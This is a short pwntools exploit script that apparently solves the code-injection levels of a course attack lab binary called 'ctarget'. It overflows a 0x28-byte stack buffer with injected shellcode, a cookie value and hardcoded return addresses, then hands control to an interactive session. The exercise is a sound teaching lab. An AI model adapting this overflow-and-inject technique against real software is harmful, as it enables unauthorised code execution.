from pwn import *
context(log_level = 'debug', arch = 'amd64', os = 'linux')

p = process(argv=['./ctarget', '-q'])

# payload1 = b'a'*0x28  + p64(0x04017C0)

# payload2 = asm('mov rdi, 0x59b997fa')
# payload2 += asm('ret')
# payload2 = payload2.ljust(0x28, b'\x00')
# payload2 += p64(0x5561dc78) + p64(0x4017ec)

payload3 = b'59b997fa' + asm('mov rdi, 0x5561dc78') + asm('ret')
payload3 = payload3.ljust(0x28, b'\x00')
payload3 += p64(0x5561dc80) + p64(0x04018fa)

p.recv()
p.sendline(payload3)

p.interactive()